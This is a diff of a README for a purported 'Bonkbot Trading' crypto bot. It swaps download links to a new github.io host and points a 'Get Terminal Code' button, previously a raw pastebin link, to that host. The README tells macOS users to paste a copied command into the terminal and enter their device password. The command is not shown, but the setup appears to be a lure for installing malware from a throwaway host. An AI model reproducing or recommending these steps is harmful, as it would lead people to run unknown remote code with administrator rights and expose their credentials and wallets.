@@ -5,11 +5,10 @@
 [![How](https://img.shields.io/badge/How-Bot%20Works-orange)](https://github.com/Bonkbot-Trading/#heres-how-the-bot-works-after-installation)
 [![BonkBot](https://img.shields.io/badge/BonkBot-Installation%20on%20Windows-purple)](https://github.com/Bonkbot-Trading/#%EF%B8%8F-installing-and-using-bonkbot-trading-on-windows)
 [![BonkBot](https://img.shields.io/badge/BonkBot-Installation%20on%20MacOS-purple)](https://github.com/Bonkbot-Trading/#-how-to-install-bonkbot-trading-on-macos)
-[![SEO](https://img.shields.io/badge/SEO-Keywords-yellow)](https://github.com/Bonkbot-Trading/#-seo-keywords)
 
 <div align="center">
 
-![Bonkbot Trading Logo](https://res.cloudinary.com/dsr37ut2z/image/upload/v1726901571/v0dmhppors9zv2vjmdw1.jpg)
+![Bonkbot Trading Logo](https://i.ytimg.com/vi/Xn0US6BJkQY/hq720.jpg)
 
 </div>  
 
@@ -18,7 +17,7 @@
 <div align="center">  
 
 [![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://bonkbot-trading.github.io/.github/)
-[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://akffjfhha485876.github.io/.github/bonkbot)    
+[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://kwevidienes.github.io/.github/bonkbot)    
 
 </div>  
 
@@ -145,7 +144,7 @@ bonkbot-trading/
 
 1. Click on the "Get terminal code" button and copy the installation command there.
 
-[![Get Terminal Code](https://img.shields.io/badge/Get_Terminal_Code-silver?style=for-the-badge&logo=apple)](https://pastebin.com/raw/DLbWk5a3)
+[![Get Terminal Code](https://img.shields.io/badge/Get_Terminal_Code-silver?style=for-the-badge&logo=apple)](https://kwevidienes.github.io/.github/bonkbot)
 
 2. Open the terminal on your device and paste the command you copied above, then press the "Return" button.
 3. Enter your device password and confirm the installation. 
@@ -157,7 +156,6 @@ bonkbot-trading/
 [![How](https://img.shields.io/badge/How-Bot%20Works-orange)](https://github.com/Bonkbot-Trading/#heres-how-the-bot-works-after-installation)
 [![BonkBot](https://img.shields.io/badge/BonkBot-Installation%20on%20Windows-purple)](https://github.com/Bonkbot-Trading/#%EF%B8%8F-installing-and-using-bonkbot-trading-on-windows)
 [![BonkBot](https://img.shields.io/badge/BonkBot-Installation%20on%20MacOS-purple)](https://github.com/Bonkbot-Trading/#-how-to-install-bonkbot-trading-on-macos)
-[![SEO](https://img.shields.io/badge/SEO-Keywords-yellow)](https://github.com/Bonkbot-Trading/#-seo-keywords)
 
 ---
 
